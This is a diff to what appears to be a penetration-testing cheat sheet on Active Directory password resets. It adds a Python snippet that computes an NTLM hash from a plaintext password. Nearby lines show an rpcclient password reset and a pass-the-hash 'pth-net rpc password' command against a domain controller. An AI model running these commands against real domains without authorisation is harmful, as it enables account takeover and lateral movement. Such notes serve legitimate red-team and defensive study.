@@ -42,6 +42,13 @@ Set-ADAccountPassword -Identity 'CN=Elisa Daugherty,OU=Accounts,DC=Fabrikam,DC=c
 setuserinfo2 <target-user> 23 'P@ssword2022'
 ```
 # Direct command for rpc
+#### Get NTLM for haze1988
+```python
+python
+import hashlib
+hashlib.new('md4', 'haze1988'.encode('utf-16le')).digest().hex()
+```
+
 ```
 pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
 ```
